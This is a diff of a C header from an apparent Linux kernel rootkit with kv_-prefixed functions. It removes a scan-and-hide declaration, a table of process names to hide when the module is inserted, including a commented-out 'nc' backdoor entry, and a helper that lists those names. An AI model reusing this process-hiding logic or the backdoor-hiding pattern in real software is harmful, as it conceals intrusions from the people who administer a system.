@@ -118,7 +118,6 @@ void kv_pid_cleanup(void);
 void kv_rename_task(pid_t, const char *);
 void kv_show_saved_tasks(void);
 void kv_show_all_tasks(void);
-void kv_scan_and_hide(void);
 void kv_send_signal(int, struct task_struct *);
 
 /** syscall,function addresses */
@@ -162,40 +161,6 @@ enum {
      */
 	KV_TASK_BD
 };
-
-struct _kv_hide_ps_on_load {
-	const char *name;
-	int type;
-};
-
-/*
-  * Hide these process names at insmod
- */
-static struct _kv_hide_ps_on_load kv_hide_ps_on_load[] = {
-
-	// Uncomment, recompile and try nc:
-	//{"nc", KV_TASK_BD},
-
-	{ NULL, -1 },
-};
-
-/*
- * Helper that returns the list of names to hide on load
- */
-static inline const char **kv_get_hide_ps_names(void)
-{
-	// XXX: using fixed maxsize kv_hide_ps_on_load for now
-	static const char *names[32];
-	if (!*names) {
-		int i = 0;
-		size_t maxnames = sizeof(names) / sizeof(*names);
-		for (; i < maxnames && kv_hide_ps_on_load[i].name != NULL;
-		     ++i) {
-			names[i] = kv_hide_ps_on_load[i].name;
-		}
-	}
-	return names;
-}
 
 // PP_NARG from
 // https://groups.google.com/forum/#!topic/comp.std.c/d-6Mj5Lko_s
